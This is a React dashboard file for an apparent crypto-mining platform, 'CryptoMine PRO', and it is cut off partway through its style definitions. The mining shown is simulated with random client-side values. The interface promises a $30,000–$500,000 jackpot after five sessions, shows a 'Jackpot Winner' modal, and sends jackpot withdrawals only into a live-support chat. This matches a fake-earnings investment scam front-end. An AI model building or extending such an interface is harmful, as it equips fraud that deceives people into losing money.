import React, { useState, useEffect, useCallback } from 'react';
import { miningAPI, walletAPI, supportAPI } from '../api';
import { useAuth } from '../AuthContext';

function openTawkChat() {
  if (window.Tawk_API && window.Tawk_API.maximize) {
    window.Tawk_API.maximize();
  }
}

// ─── Jackpot Modal ────────────────────────────────────────
function JackpotModal({ amount, onClose }) {
  return (
    <div style={modal.overlay}>
      <div style={modal.card}>
        <div style={modal.confetti}>
          {['🎊','🏆','🎉','✨','💰','🎊','✨'].map((e, i) => (
            <span key={i} style={{ ...modal.piece, left: `${10 + i * 13}%`, animationDelay: `${i * 0.2}s` }}>{e}</span>
          ))}
        </div>
        <div style={modal.trophy}>🏆</div>
        <h2 style={modal.title}>Jackpot Winner!</h2>
        <div style={modal.amountBox}>
          <div style={modal.amountLabel}>You've won</div>
          <div style={modal.amount}>${amount?.toLocaleString()}</div>
        </div>
        <p style={modal.note}>Your wallet has been credited. To process your withdrawal, please contact our support team.</p>
        <button style={modal.primaryBtn} onClick={() => { openTawkChat(); onClose(); }}>
          💬 Contact Support to Withdraw
        </button>
        <button style={modal.secondaryBtn} onClick={onClose}>View My Dashboard</button>
      </div>
      <style>{`@keyframes fall { 0%{opacity:1;transform:translateY(-20px) rotate(0)} 100%{opacity:0;transform:translateY(60px) rotate(180deg)} }`}</style>
    </div>
  );
}

// ─── Sidebar Nav Item ────────────────────────────────────
function NavItem({ icon, label, active, onClick }) {
  return (
    <button style={{ ...nav.item, ...(active ? nav.active : {}) }} onClick={onClick}>
      <span style={nav.icon}>{icon}</span>
      <span>{label}</span>
      {active && <div style={nav.indicator} />}
    </button>
  );
}

// ─── KPI Card ─────────────────────────────────────────────
function KPICard({ icon, label, value, sub, accent = '#0B1F3A', highlight }) {
  return (
    <div style={{ ...kpi.card, ...(highlight ? kpi.highlightCard : {}) }}>
      <div style={{ ...kpi.iconWrap, background: highlight ? 'rgba(201,168,76,0.15)' : '#f0eee8', color: highlight ? '#C9A84C' : '#0B1F3A' }}>{icon}</div>
      <div style={kpi.body}>
        <div style={kpi.label}>{label}</div>
        <div style={{ ...kpi.value, color: highlight ? '#C9A84C' : '#0B1F3A' }}>{value}</div>
        {sub && <div style={kpi.sub}>{sub}</div>}
      </div>
    </div>
  );
}

// ─── Main Dashboard ───────────────────────────────────────
export default function Dashboard() {
  const { user, logout } = useAuth();
  const [stats, setStats] = useState(null);
  const [wallet, setWallet] = useState(user?.wallet || { balance: 0, jackpotWinnings: 0 });
  const [transactions, setTransactions] = useState([]);
  const [mining, setMining] = useState(false);
  const [miningProgress, setMiningProgress] = useState(0);
  const [showJackpot, setShowJackpot] = useState(false);
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [walletAddress, setWalletAddress] = useState(user?.wallet?.address || '');
  const [toast, setToast] = useState(null);
  const [loading, setLoading] = useState(false);
  const [tab, setTab] = useState('dashboard');

  const showToast = (msg, type = 'success') => {
    setToast({ msg, type });
    setTimeout(() => setToast(null), 5000);
  };

  const fetchData = useCallback(async () => {
    try {
      const [statsRes, txRes] = await Promise.all([
        miningAPI.getStats(),
        miningAPI.getTransactions(),
      ]);
      setStats(statsRes.data.stats);
      setWallet(statsRes.data.wallet);
      setTransactions(txRes.data);
      if (statsRes.data.jackpotTriggered && !sessionStorage.getItem('jackpotDismissed')) {
        setShowJackpot(true);
      }
    } catch (err) {
      console.error(err);
    }
  }, []);

  useEffect(() => { fetchData(); }, [fetchData]);

  const startMining = async () => {
    setMining(true);
    setMiningProgress(0);
    const interval = setInterval(() => setMiningProgress(p => Math.min(p + 3, 95)), 90);
    const duration = Math.floor(Math.random() * 60) + 30;
    const hashRate = Math.floor(Math.random() * 600) + 150;
    setTimeout(async () => {
      clearInterval(interval);
      setMiningProgress(100);
      try {
        const res = await miningAPI.startSession({ duration, hashRate });
        setWallet(res.data.wallet);
        showToast(`⛏ Session complete! Earned $${res.data.sessionEarnings.toFixed(2)}`);
        fetchData();
      } catch {
        showToast('Mining session failed', 'error');
      }
      setTimeout(() => { setMining(false); setMiningProgress(0); }, 600);
    }, 3000);
  };

  const handleWithdraw = async () => {
    if (!withdrawAmount || isNaN(withdrawAmount)) return;
    setLoading(true);
    try {
      const res = await walletAPI.withdraw(parseFloat(withdrawAmount));
      if (res.data.requiresSupport) {
        showToast("🎉 Jackpot withdrawal — opening support chat…", 'gold');
        await supportAPI.createRequest({ type: 'jackpot_withdrawal', method: 'livechat', amount: parseFloat(withdrawAmount) });
        setTimeout(openTawkChat, 800);
      } else {
        showToast('✅ Withdrawal request submitted!');
        fetchData();
      }
      setWithdrawAmount('');
    } catch (err) {
      showToast(err.response?.data?.message || 'Withdrawal failed', 'error');
    }
    setLoading(false);
  };

  const handleConnectWallet = async () => {
    if (!walletAddress.trim()) return;
    try {
      await walletAPI.connectWallet(walletAddress);
      showToast('✅ Wallet connected successfully!');
    } catch {
      showToast('Failed to connect wallet', 'error');
    }
  };

  const sessionCount = stats?.sessionHistory?.length || 0;

  return (
    <div style={app.root}>
      {showJackpot && (
        <JackpotModal
          amount={wallet.jackpotWinnings}
          onClose={() => { setShowJackpot(false); sessionStorage.setItem('jackpotDismissed', '1'); }}
        />
      )}

      {/* Toast */}
      {toast && (
        <div style={{ ...app.toast, background: toast.type === 'error' ? '#c0392b' : toast.type === 'gold' ? '#C9A84C' : '#1a6b42', color: toast.type === 'gold' ? '#0B1F3A' : '#fff' }}>
          {toast.msg}
          {toast.type === 'gold' && (
            <button style={app.toastChatBtn} onClick={openTawkChat}>Open Chat →</button>
          )}
        </div>
      )}

      {/* Sidebar */}
      <aside style={app.sidebar}>
        <div style={app.sidebarTop}>
          <div style={app.logo}>
            <span style={app.logoIcon}>⛏</span>
            <div>
              <div style={app.logoName}>CryptoMine</div>
              <div style={app.logoPro}>PRO</div>
            </div>
          </div>

          <nav style={app.navGroup}>
            <div style={app.navLabel}>MENU</div>
            {[
              { id: 'dashboard', icon: '◈', label: 'Overview' },
              { id: 'mining', icon: '⛏', label: 'Mining Rig' },
              { id: 'wallet', icon: '◎', label: 'Wallet' },
              { id: 'transactions', icon: '≡', label: 'Transactions' },
            ].map(item => (
              <NavItem key={item.id} {...item} active={tab === item.id} onClick={() => setTab(item.id)} />
            ))}
          </nav>

          {wallet.jackpotWinnings > 0 && (
            <div style={app.jackpotBanner} onClick={() => setShowJackpot(true)}>
              <div style={app.jbIcon}>🏆</div>
              <div>
                <div style={app.jbTitle}>Jackpot Won!</div>
                <div style={app.jbAmount}>${wallet.jackpotWinnings?.toLocaleString()}</div>
              </div>
            </div>
          )}
        </div>

        <div style={app.sidebarBottom}>
          <div style={app.userCard}>
            <div style={app.userAvatar}>{user?.username?.[0]?.toUpperCase()}</div>
            <div style={app.userInfo}>
              <div style={app.userName}>{user?.username}</div>
              <div style={app.userEmail}>{user?.email}</div>
            </div>
          </div>
          <button style={app.logoutBtn} onClick={logout}>Sign out</button>
        </div>
      </aside>

      {/* Main */}
      <main style={app.main}>
        {/* Page header */}
        <div style={app.pageHeader}>
          <div>
            <h1 style={app.pageTitle}>
              {tab === 'dashboard' && 'Overview'}
              {tab === 'mining' && 'Mining Rig'}
              {tab === 'wallet' && 'Wallet'}
              {tab === 'transactions' && 'Transaction History'}
            </h1>
            <p style={app.pageDate}>{new Date().toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric' })}</p>
          </div>
        </div>

        {/* ── OVERVIEW TAB ── */}
        {tab === 'dashboard' && (
          <div>
            <div style={page.kpiGrid}>
              <KPICard icon="💵" label="Wallet Balance" value={`$${wallet.balance?.toFixed(2) || '0.00'}`} sub="Available funds" highlight={wallet.jackpotWinnings > 0} />
              <KPICard icon="⚡" label="Hash Rate" value={`${stats?.hashRate || 0} MH/s`} sub="Current speed" />
              <KPICard icon="⏱" label="Total Uptime" value={`${(stats?.uptime || 0).toFixed(1)}h`} sub="All time" />
              <KPICard icon="🪙" label="Coins Mined" value={(stats?.coinsMined || 0).toFixed(6)} sub="Cumulative" />
            </div>

            <div style={page.twoCol}>
              {/* Balance card */}
              <div style={page.balCard}>
                <div style={page.balHeader}>
                  <span style={page.balTitle}>Total Earnings</span>
                  <span style={page.balBadge}>All Time</span>
                </div>
                <div style={page.balAmount}>${(stats?.totalEarnings || 0).toFixed(2)}</div>
                {wallet.jackpotWinnings > 0 && (
                  <div style={page.jackpotRow}>
                    <span style={page.jtIcon}>🏆</span>
                    <span style={page.jtText}>Jackpot Winnings</span>
                    <span style={page.jtAmount}>${wallet.jackpotWinnings?.toLocaleString()}</span>
                  </div>
                )}
                <div style={page.progressLabel}>
                  <span>Mining sessions</span>
                  <span style={{ color: '#0B1F3A', fontWeight: '600' }}>{sessionCount} / 5 for jackpot eligibility</span>
                </div>
                <div style={page.progressTrack}>
                  <div style={{ ...page.progressFill, width: `${Math.min(sessionCount / 5 * 100, 100)}%` }} />
                </div>
                <p style={page.progressNote}>
                  {sessionCount >= 5 ? '✅ Jackpot monitoring active — keep mining!' : `${5 - sessionCount} more session${5 - sessionCount !== 1 ? 's' : ''} to unlock jackpot eligibility`}
                </p>
              </div>

              {/* Recent activity */}
              <div style={page.actCard}>
                <div style={page.actHeader}>
                  <span style={page.actTitle}>Recent Activity</span>
                  <span style={{ ...page.actLink, cursor:'pointer' }} onClick={() => setTab('transactions')}>View all →</span>
                </div>
                {transactions.length === 0 && <p style={page.empty}>No activity yet. Start your first mining session!</p>}
                {transactions.slice(0, 6).map(tx => (
                  <div key={tx._id} style={page.actRow}>
                    <div style={page.actIcon(tx.type)}>
                      {tx.type === 'mining' ? '⛏' : tx.type === 'jackpot' ? '🏆' : '↗'}
                    </div>
                    <div style={page.actInfo}>
                      <div style={page.actType}>{tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}</div>
                      <div style={page.actDate}>{new Date(tx.createdAt).toLocaleDateString()}</div>
                    </div>
                    <div style={{ ...page.actAmt, color: tx.type === 'withdrawal' ? '#c0392b' : tx.type === 'jackpot' ? '#C9A84C' : '#1a6b42' }}>
                      {tx.type === 'withdrawal' ? '-' : '+'}${tx.amount?.toFixed(2)}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* ── MINING TAB ── */}
        {tab === 'mining' && (
          <div style={page.miningWrap}>
            <div style={page.rigCard}>
              <div style={page.rigVisual}>
                {[0, 1, 2].map(i => (
                  <div key={i} style={{ ...page.gpu, animationDelay: `${i * 0.4}s`, animation: mining ? `gpuGlow 1.5s ease-in-out infinite` : 'none' }}>
                    <div style={page.gpuBody}>🖥</div>
                    <div style={{ ...page.gpuLight, background: mining ? '#C9A84C' : '#ddd' }} />
                  </div>
                ))}
              </div>
              <div style={page.rigStatus}>
                <div style={{ ...page.rigDot, background: mining ? '#1a6b42' : '#d0ccbf' }} />
                <span style={{ color: mining ? '#1a6b42' : '#8c96a6', fontWeight: '600', fontSize: '14px' }}>
                  {mining ? 'Mining in progress…' : 'Ready to mine'}
                </span>
              </div>
              {mining && (
                <div style={page.progressWrap}>
                  <div style={page.progressTrack}>
                    <div style={{ ...page.progressFill, width: `${miningProgress}%`, transition: 'width 0.1s linear' }} />
                  </div>
                  <span style={page.progressPct}>{miningProgress}%</span>
                </div>
              )}
            </div>

            <div style={page.miningStats}>
              {[
                { label: 'Sessions Completed', value: sessionCount },
                { label: 'Current Hash Rate', value: `${stats?.hashRate || 0} MH/s` },
                { label: 'Coins Mined', value: (stats?.coinsMined || 0).toFixed(8) },
                { label: 'Total Earnings', value: `$${(stats?.totalEarnings || 0).toFixed(2)}` },
              ].map(({ label, value }) => (
                <div key={label} style={page.mStat}>
                  <span style={page.mStatLabel}>{label}</span>
                  <span style={page.mStatValue}>{value}</span>
                </div>
              ))}
            </div>

            <button style={{ ...page.mineBtn, opacity: mining ? 0.65 : 1 }} onClick={startMining} disabled={mining}>
              {mining ? '⛏  Mining…' : '⛏  Start Mining Session'}
            </button>

            {sessionCount >= 5 && (
              <div style={page.jackpotHint}>
                <span style={page.jhIcon}>🎰</span>
                <div>
                  <strong>Jackpot monitoring is active.</strong> You've completed {sessionCount} sessions. A jackpot between $30,000 and $500,000 may trigger automatically between day 4–7.
                </div>
              </div>
            )}
          </div>
        )}

        {/* ── WALLET TAB ── */}
        {tab === 'wallet' && (
          <div style={page.walletWrap}>
            <div style={page.balanceHero}>
              <div style={page.heroLabel}>Current Balance</div>
              <div style={page.heroAmount}>${wallet.balance?.toFixed(2) || '0.00'}</div>
              {wallet.jackpotWinnings > 0 && (
                <div style={page.heroJackpot}>
                  <span>🏆</span>
                  <span>Includes jackpot winnings of ${wallet.jackpotWinnings?.toLocaleString()}</span>
                </div>
              )}
              {wallet.address && (
                <div style={page.heroAddr}>📎 {wallet.address.slice(0, 24)}…</div>
              )}
            </div>

            <div style={page.walletCards}>
              <div style={page.wCard}>
                <div style={page.wCardTitle}>Connect Wallet</div>
                <p style={page.wCardSub}>Link your crypto wallet to enable withdrawals.</p>
                <label style={s2.label}>Wallet Address</label>
                <input style={s2.input} placeholder="0x1a2b3c4d5e…" value={walletAddress}
                  onChange={e => setWalletAddress(e.target.value)} />
                <button style={s2.outlineBtn} onClick={handleConnectWallet}>Connect Wallet</button>
              </div>

              <div style={page.wCard}>
                <div style={page.wCardTitle}>Withdraw Funds</div>
                <p style={page.wCardSub}>Enter the amount you'd like to withdraw.</p>
                {wallet.jackpotWinnings > 0 && (
                  <div style={page.wJackpotNote}>
                    ⚠️ Jackpot withdrawals require support verification. Live chat will open automatically.
                  </div>
                )}
                <label style={s2.label}>Amount (USD)</label>
                <input style={s2.input} type="number" placeholder="e.g. 500.00" value={withdrawAmount}
                  onChange={e => setWithdrawAmount(e.target.value)} />
                <button style={s2.goldBtn} onClick={handleWithdraw} disabled={loading}>
                  {loading ? 'Processing…' : 'Request Withdrawal'}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ── TRANSACTIONS TAB ── */}
        {tab === 'transactions' && (
          <div>
            {transactions.length === 0 && <p style={page.empty}>No transactions yet. Start mining to generate history!</p>}
            <div style={page.txList}>
              {transactions.map(tx => (
                <div key={tx._id} style={page.txCard}>
                  <div style={page.txLeft}>
                    <div style={page.txIconWrap(tx.type)}>
                      {tx.type === 'mining' ? '⛏' : tx.type === 'jackpot' ? '🏆' : '↗'}
                    </div>
                    <div>
                      <div style={page.txType}>{tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}</div>
                      <div style={page.txDesc}>{tx.description}</div>
                    </div>
                  </div>
                  <div style={page.txRight}>
                    <div style={{ ...page.txAmount, color: tx.type === 'withdrawal' ? '#c0392b' : tx.type === 'jackpot' ? '#C9A84C' : '#1a6b42' }}>
                      {tx.type === 'withdrawal' ? '-' : '+'}${tx.amount?.toFixed(2)}
                    </div>
                    <div style={page.txStatus(tx.status)}>{tx.status}</div>
                    <div style={page.txDate}>{new Date(tx.createdAt).toLocaleString()}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </main>

      <style>{`
        * { box-sizing: border-box; }
        body { background: #f7f5f0; margin: 0; }
        input:focus { outline: none; border-color: #C9A84C !important; box-shadow: 0 0 0 3px rgba(201,168,76,0.12) !important; }
        input::placeholder { color: #b0b8c4; }
        @keyframes gpuGlow { 0%,100%{filter:drop-shadow(0 0 4px rgba(201,168,76,0.3))} 50%{filter:drop-shadow(0 0 12px rgba(201,168,76,0.7))} }
        @keyframes fall { 0%{opacity:1;transform:translateY(0) rotate(0)} 100%{opacity:0;transform:translateY(70px) rotate(240deg)} }
      `}</style>
    </div>
  );
}

// ─── NAV STYLES ───────────────────────────────────────────
const nav = {
  item: { display: 'flex', alignItems: 'center', gap: '10px', padding: '11px 14px', borderRadius: '10px', border: 'none', background: 'transparent', color: '#8c96a6', fontSize: '14px', cursor: 'pointer', width: '100%', textAlign: 'left', fontFamily: 'inherit', transition: 'all 0.15s', position: 'relative' },
  active: { background: '#f0ebe0', color: '#0B1F3A', fontWeight: '600' },
  icon: { fontSize: '16px', width: '20px', textAlign: 'center' },
  indicator: { position: 'absolute', left: 0, top: '50%', transform: 'translateY(-50%)', width: '3px', height: '20px', background: '#C9A84C', borderRadius: '0 3px 3px 0' },
};

// ─── APP LAYOUT STYLES ────────────────────────────────────
const app = {
  root: { display: 'flex', minHeight: '100vh', background: '#f7f5f0', fontFamily: "'DM Sans', 'Segoe UI', sans-serif" },
  sidebar: { width: '248px', minHeight: '100vh', background: '#fff', borderRight: '1px solid #ece8e0', display: 'flex', flexDirection: 'column', justifyContent: 'space-between', padding: '28px 16px' },
  sidebarTop: { display: 'flex', flexDirection: 'column', gap: '28px' },
  logo: { display: 'flex', alignItems: 'center', gap: '10px', padding: '4px 10px' },
  logoIcon: { fontSize: '22px' },
  logoName: { color: '#0B1F3A', fontSize: '16px', fontWeight: '700', letterSpacing: '-0.3px', lineHeight: 1 },
  logoPro: { color: '#C9A84C', fontSize: '9px', fontWeight: '700', letterSpacing: '2px' },
  navGroup: { display: 'flex', flexDirection: 'column', gap: '2px' },
  navLabel: { color: '#c4bdb0', fontSize: '10px', fontWeight: '700', letterSpacing: '1.5px', padding: '4px 14px 8px' },
  jackpotBanner: { background: 'linear-gradient(135deg,#fffbec,#fff5d0)', border: '1px solid #e8c96a', borderRadius: '12px', padding: '14px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '10px' },
  jbIcon: { fontSize: '22px' },
  jbTitle: { color: '#7a6020', fontSize: '11px', fontWeight: '600', letterSpacing: '0.5px', textTransform: 'uppercase' },
  jbAmount: { color: '#C9A84C', fontSize: '18px', fontWeight: '700', letterSpacing: '-0.5px' },
  sidebarBottom: { display: 'flex', flexDirection: 'column', gap: '12px' },
  userCard: { display: 'flex', alignItems: 'center', gap: '10px', padding: '12px', background: '#f7f5f0', borderRadius: '10px' },
  userAvatar: { width: '34px', height: '34px', borderRadius: '50%', background: 'linear-gradient(135deg,#0B1F3A,#1a3a6e)', color: '#C9A84C', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '700', fontSize: '14px', flexShrink: 0 },
  userInfo: { overflow: 'hidden' },
  userName: { color: '#0B1F3A', fontSize: '13px', fontWeight: '600', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' },
  userEmail: { color: '#8c96a6', fontSize: '11px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' },
  logoutBtn: { background: 'none', border: 'none', color: '#8c96a6', fontSize: '13px', cursor: 'pointer', textAlign: 'left', padding: '4px 12px', fontFamily: 'inherit' },
  main: { flex: 1, padding: '36px 40px', overflowY: 'auto' },
  pageHeader: { marginBottom: '32px' },
  pageTitle: { color: '#0B1F3A', fontSize: '26px', fontWeight: '700', letterSpacing: '-0.5px', marginBottom: '4px' },
  pageDate: { color: '#8c96a6', fontSize: '14px' },
  toast: { position: 'fixed', top: '24px', right: '24px', borderRadius: '12px', padding: '14px 20px', fontSize: '14px', fontWeight: '600', zIndex: 9999, display: 'flex', alignItems: 'center', gap: '12px', boxShadow: '0 8px 32px rgba(0,0,0,0.15)', maxWidth: '420px' },
  toastChatBtn: { background: 'rgba(255,255,255,0.3)', border: 'none', borderRadius: '6px', padding: '4px 12px', color: '#0B1F3A', cursor: 'pointer', fontWeight: '700', fontSize: '13px', whiteSpace: 'nowrap' },
};

// ─── KPI STYLES ───────────────────────────────────────────
const kpi = {
  card: { background: '#fff', borderRadius: '14px', padding: '20px', border: '1px solid #ece8e0', display: 'flex', alignItems: 'center', gap: '16px' },
  highlightCard: { background: 'linear-gradient(135deg,#fffbec,#fff8e0)', border: '1px solid #e8c96a' },
  iconWrap: { width: '48px', height: '48px', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '22px', flexShrink: 0 },
  body: {},
  label: { color: '#8c96a6', fontSize: '12px', fontWeight: '500', letterSpacing: '0.3px', marginBottom: '4px' },
  value: { fontSize: '22px', fontWeight: '700', letterSpacing: '-0.5px', lineHeight: 1 },
  sub: { color: '#b0b8c4', fontSize: '11px', marginTop: '4px' },
};

// ─── PAGE CONTENT STYLES ──────────────────────────────────
const page = {
  kpiGrid: { display: 'grid', gridTemplateColumns: 'repeat(auto-fit,minmax(200px,1fr))', gap: '16px', marginBottom: '24px' },
  twoCol: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' },
  // Balance card
  balCard: { background: '#fff', borderRadius: '16px', padding: '28px', border: '1px solid #ece8e0' },
  balHeader: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' },
  balTitle: { color: '#8c96a6', fontSize: '13px', fontWeight: '600', letterSpacing: '0.3px' },
  balBadge: { background: '#f0ebe0', color: '#8c7a55', fontSize: '11px', padding: '3px 10px', borderRadius: '20px', fontWeight: '600' },
  balAmount: { color: '#0B1F3A', fontSize: '36px', fontWeight: '700', letterSpacing: '-1px', marginBottom: '16px' },
  jackpotRow: { display: 'flex', alignItems: 'center', gap: '8px', background: '#fffbec', border: '1px solid #e8c96a', borderRadius: '8px', padding: '10px 14px', marginBottom: '20px' },
  jtIcon: { fontSize: '18px' },
  jtText: { color: '#7a6020', fontSize: '13px', flex: 1 },
  jtAmount: { color: '#C9A84C', fontWeight: '700', fontSize: '16px' },
  progressLabel: { display: 'flex', justifyContent: 'space-between', fontSize: '12px', color: '#8c96a6', marginBottom: '8px' },
  progressTrack: { height: '6px', background: '#f0ebe0', borderRadius: '3px', overflow: 'hidden', marginBottom: '8px' },
  progressFill: { height: '100%', background: 'linear-gradient(90deg,#C9A84C,#e8c96a)', borderRadius: '3px', transition: 'width 0.5s ease' },
  progressNote: { color: '#8c96a6', fontSize: '12px' },
  // Activity card
  actCard: { background: '#fff', borderRadius: '16px', padding: '28px', border: '1px solid #ece8e0' },
  actHeader: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' },
  actTitle: { color: '#0B1F3A', fontSize: '15px', fontWeight: '700' },
  actLink: { color: '#C9A84C', fontSize: '13px', fontWeight: '600' },
  actRow: { display: 'flex', alignItems: 'center', gap: '12px', padding: '11px 0', borderBottom: '1px solid #f5f2eb' },
  actIcon: (t) => ({ width: '36px', height: '36px', borderRadius: '50%', background: t === 'jackpot' ? '#fffbec' : t === 'mining' ? '#f0f7f4' : '#fff5f5', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '16px', flexShrink: 0 }),
  actInfo: { flex: 1 },
  actType: { color: '#0B1F3A', fontSize: '13px', fontWeight: '600' },
  actDate: { color: '#b0b8c4', fontSize: '11px', marginTop: '2px' },
  actAmt: { fontWeight: '700', fontSize: '14px' },
  empty: { color: '#b0b8c4', textAlign: 'center', padding: '48px', fontSize: '14px' },
  // Mining page
  miningWrap: { display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '24px', maxWidth: '600px', margin: '0 auto' },
  rigCard: { background: '#fff', borderRadius: '20px', padding: '40px', border: '1px solid #ece8e0', width: '100%', textAlign: 'center' },
  rigVisual: { display: 'flex', justifyContent: 'center', gap: '32px', marginBottom: '28px' },
  gpu: { display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' },
  gpuBody: { fontSize: '48px' },
  gpuLight: { width: '8px', height: '8px', borderRadius: '50%', transition: 'background 0.3s' },
  rigStatus: { display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '16px' },
  rigDot: { width: '8px', height: '8px', borderRadius: '50%', transition: 'background 0.3s' },
  progressWrap: { display: 'flex', alignItems: 'center', gap: '12px', marginTop: '8px' },
  progressPct: { color: '#C9A84C', fontSize: '13px', fontWeight: '700', minWidth: '32px' },
  miningStats: { background: '#fff', borderRadius: '16px', padding: '24px', border: '1px solid #ece8e0', width: '100%' },
  mStat: { display: 'flex', justifyContent: 'space-between', padding: '13px 0', borderBottom: '1px solid #f5f2eb', fontSize: '14px' },
  mStatLabel: { color: '#8c96a6' },
  mStatValue: { color: '#0B1F3A', fontWeight: '600' },
  mineBtn: { background: 'linear-gradient(135deg,#b8922e,#d4a93c,#e8c96a)', border: 'none', borderRadius: '14px', padding: '18px 52px', color: '#0B1F3A', fontSize: '16px', fontWeight: '700', cursor: 'pointer', boxShadow: '0 6px 24px rgba(201,168,76,0.35)', transition: 'all 0.2s', letterSpacing: '0.2px', fontFamily: 'inherit' },
  jackpotHint: { background: '#fffbec', border: '1px solid #e8c96a', borderRadius: '12px', padding: '16px 20px', color: '#5a4510', fontSize: '14px', display: 'flex', gap: '14px', alignItems: 'flex-start', width: '100%', lineHeight: '1.6' },
  jhIcon: { fontSize: '20px', flexShrink: 0 },
  // Wallet page
  walletWrap: { display: 'flex', flexDirection: 'column', gap: '24px' },
  balanceHero: { background: 'linear-gradient(135deg,#0B1F3A 0%,#1a3a6e 100%)', borderRadius: '20px', padding: '40px', color: '#fff', textAlign: 'center' },
  heroLabel: { color: 'rgba(255,255,255,0.55)', fontSize: '13px', letterSpacing: '1px', textTransform: 'uppercase', marginBottom: '8px' },
  heroAmount: { fontSize: '52px', fontWeight: '700', letterSpacing: '-2px', marginBottom: '12px' },
  heroJackpot: { display: 'inline-flex', gap: '8px', alignItems: 'center', background: 'rgba(201,168,76,0.2)', border: '1px solid rgba(201,168,76,0.4)', borderRadius: '20px', padding: '8px 20px', color: '#C9A84C', fontWeight: '600', fontSize: '14px', marginBottom: '8px' },
  heroAddr: { color: 'rgba(255,255,255,0.4)', fontSize: '13px', marginTop: '8px', fontFamily: 'monospace' },
  walletCards: { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' },
  wCard: { background: '#fff', borderRadius: '16px', padding: '28px', border: '1px solid #ece8e0', display: 'flex', flexDirection: 'column', gap: '14px' },
  wCardTitle: { color: '#0B1F3A', fontSize: '16px', fontWeight: '700' },
  wCardSub: { color: '#8c96a6', fontSize: '14px', margin: 0 },
  wJackpotNote: { background: '#fffbec', border: '1px solid #e8c96a', borderRadius: '8px', padding: '10px 14px', color: '#7a6020', fontSize: '13px' },
  // Transactions page
  txList: { display: 'flex', flexDirection: 'column', gap: '10px' },
  txCard: { background: '#fff', borderRadius: '12px', padding: '18px 22px', border: '1px solid #ece8e0', display: 'flex', justifyContent: 'space-between', alignItems: 'center' },
  txLeft: { display: 'flex', alignItems: 'center', gap: '16px' },
  txIconWrap: (t) => ({ width: '42px', height: '42px', borderRadius: '50%', background: t === 'jackpot' ? '#fffbec' : t === 'mining' ? '#f0f7f4' : '#fff5f5', border: `1px solid ${t === 'jackpot' ? '#e8c96a' : t === 'mining' ? '#b8dcc8' : '#f5c6cb'}`, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '18px' }),
  txType: { color: '#0B1F3A', fontSize: '14px', fontWeight: '600', marginBottom: '3px' },
  txDesc: { color: '#8c96a6', fontSize: '12px' },
  txRight: { textAlign: 'right' },
  txAmount: { fontSize: '16px', fontWeight: '700', marginBottom: '3px' },
  txStatus: (s) => ({ color: '#b0b8c4', fontSize: '11px', letterSpacing: '0.5px', textTransform: 'uppercase' }),
  txDate: { color: '#c4bdb0', fontSize: '11px', marginTop: '3px' },
};

// ─── FORM STYLES (wallet tab) ─────────────────────────────
const s2 = {
  label: { color: '#3a4a5c', fontSize: '13px', fontWeight: '600', letterSpacing: '0.3px' },
  input: { border: '1.5px solid #e4dfd5', borderRadius: '10px', padding: '12px 15px', fontSize: '14px', color: '#0B1F3A', background: '#fdfcfa', fontFamily: 'inherit', width: '100%', transition: 'all 0.2s' },
  outlineBtn: { background: '#fff', border: '1.5px solid #0B1F3A', borderRadius: '10px', padding: '13px', color: '#0B1F3A', fontSize: '14px', fontWeight: '600', cursor: 'pointer', fontFamily: 'inherit', transition: 'all 0.2s' },
  goldBtn: { background: 'linear-gradient(135deg,#b8922e,#d4a93c,#e8c96a)', border: 'none', borderRadius: '10px', padding: '13px', color: '#0B1F3A', fontSize: '14px', fontWeight: '700', cursor: 'pointer', fontFamily: 'inherit', boxShadow: '0 4px 16px rgba(201,168,76,0.3)', transition: 'all 0.2s' },
};

// ─── MODAL STYLES ─────────────────────────────────────────
const modal = {
  overlay: { position: 'fixed', inset: 0, background: 'rgba(11,31,58,0.7)', backdropFilter: 'blur(4px)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center' },
  card: { background: '#fff', borderRadius: '24px', padding: '52px 44px', textAlign: 'center', maxWidth: '440px', width: '90%', boxShadow: '0 24px 80px rgba(11,31,58,0.25)', position: 'relative', overflow: 'hidden' },
  confetti: { position: 'absolute', top: 0, left: 0, right: 0, pointerEvents: 'none', height: '60px' },
  piece: { position: 'absolute', top: '8px', fontSize: '20px', animation: 'fall 2.5s ease-out infinite' },
  trophy: { fontSize: '56px', marginBottom: '16px' },
  title: { color: '#0B1F3A', fontSize: '30px', fontWeight: '700', letterSpacing: '-0.5px', marginBottom: '20px' },
  amountBox: { background: 'linear-gradient(135deg,#fffbec,#fff5d0)', border: '1px solid #e8c96a', borderRadius: '14px', padding: '20px', marginBottom: '20px' },
  amountLabel: { color: '#8c7a55', fontSize: '13px', fontWeight: '600', letterSpacing: '0.5px', textTransform: 'uppercase', marginBottom: '6px' },
  amount: { color: '#C9A84C', fontSize: '40px', fontWeight: '700', letterSpacing: '-1px' },
  note: { color: '#8c96a6', fontSize: '14px', lineHeight: '1.7', marginBottom: '28px' },
  primaryBtn: { background: 'linear-gradient(135deg,#b8922e,#e8c96a)', border: 'none', borderRadius: '12px', padding: '15px 32px', color: '#0B1F3A', fontWeight: '700', cursor: 'pointer', fontSize: '15px', width: '100%', marginBottom: '12px', fontFamily: 'inherit', boxShadow: '0 6px 20px rgba(201,168,76,0.35)' },
